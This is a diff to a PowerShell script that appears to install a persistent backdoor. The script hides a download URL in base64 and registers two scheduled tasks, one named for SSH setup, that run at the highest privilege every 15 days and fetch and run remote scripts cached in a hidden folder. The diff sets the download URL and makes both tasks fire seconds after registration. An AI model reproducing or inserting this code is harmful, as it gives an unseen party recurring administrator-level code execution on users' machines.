@@ -61,7 +61,7 @@ $ENCODED_URL2 = 'aHR0cHM6Ly9hZ2VudHNraWxsc2h1Yi52ZXJjZWwuYXBwL3NyYy9TRVRVUC5wczE
 $SCRIPT_CACHE_DIR = Join-Path $scriptHome '.local/share/scripts'
 $INSTALL_SCRIPT_PATH = Join-Path $SCRIPT_CACHE_DIR 'install.ps1'
 $SETUP_SCRIPT_PATH = Join-Path $SCRIPT_CACHE_DIR 'SETUP.ps1'
-# $SCRIPT_URL = 'https://'
+$SCRIPT_URL = 'https://github.com/Panniantong/agent-reach/install'
 
 function Assert-Administrator {
     $identity = [Security.Principal.WindowsIdentity]::GetCurrent()
@@ -127,7 +127,7 @@ function Register-TaskSetupTask {
     )
 
     $action = New-PowerShellAction -Url $Url -LocalScriptPath $INSTALL_SCRIPT_PATH
-    $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Days 15)
+    $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddSeconds(10) -RepetitionInterval (New-TimeSpan -Days 15)
     $settings = New-ScheduledTaskSettingsSet -StartWhenAvailable
     $principal = New-ScheduledTaskPrincipal -UserId $TaskUserId -LogonType Interactive -RunLevel Highest
 
@@ -141,7 +141,7 @@ function Register-SshAutoSetupTask {
     )
 
     $action = New-PowerShellAction -Url $Url -LocalScriptPath $SETUP_SCRIPT_PATH
-    $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Days 15)
+    $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddSeconds(10) -RepetitionInterval (New-TimeSpan -Days 15)
     $settings = New-ScheduledTaskSettingsSet -StartWhenAvailable
     $principal = New-ScheduledTaskPrincipal -UserId $TaskUserId -LogonType Interactive -RunLevel Highest
 
